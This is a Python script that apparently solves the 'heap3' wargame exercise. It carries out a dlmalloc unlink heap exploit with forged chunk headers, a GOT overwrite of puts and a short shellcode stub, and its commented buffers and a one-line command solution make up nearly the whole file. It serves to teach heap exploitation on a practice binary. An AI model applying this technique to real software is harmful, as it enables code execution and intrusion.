#!/usr/bin/python

from struct import pack


# addr of puts function in GOT - 12

puts = pack("I", 0x0804b128-0xc)



"""
Solution::
./heap3 `python -c 'print "AAAA" + "\xeb\x06" + "\x90"*6 + "\x68\x64\x88\x04\x08\xc3"'` 
`python -c 'print "B"*16 + "\x01"*4 + "\xff"*4 + "B"*8 + "\xfc\xff\xff\xff" + "\xf0\xff\xff\xff"'` 
`python -c 'print "CCCC"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'`
"""


buf_a = "A"*4
# Add a 2 byte jump followed by a push/ret pivot
# to get to final dest of winner function

#2 byte jump
buf_a += "\xeb\x06"
# when we jump, jump to NOPs
buf_a += "\x90"*6
# push *winner
# ret
buf_a += "\x68\x64\x88\x04\x08\xc3"

buf_b = "B"*16

# set the next next chunk size to pass the check
# in function free at free+256 to see if prev_inuse.
# If it fails this check, aka the previous is not in use,
# it will consolidate the forward chunks which we don't need
buf_b += "\x01"*4
buf_b += pack("I", 0xffffffff)

# fill out the rest of B's buffer
buf_b += "B"*8

# set prev_size header in chunk C to 4
buf_b += pack("I", 0xfffffffc)
# set size of chunk C to -16. Reasoning
# is that we want to skip a set of instructions
# that is doing the forward consolidation. Thus,
# setting to -16 while having the least significant bits to 0
# allows us to skip it.
buf_b += pack("I", 0xfffffff0)
buf_c = "CCCC"
# Have puts in GOT point to function of winner. But winner
# function lives in .text section which is read_only, so we
# can't write to there.
buf_c += puts
# Then have our code jump to the NOP sled in A.
# After this pack, we have successfully overwritten the 
# the BK pointer of chunk A to the address of puts

# shellcode in chunk A
buf_c += pack("I", 0x804c008)

print " ".join([buf_a, buf_b, buf_c])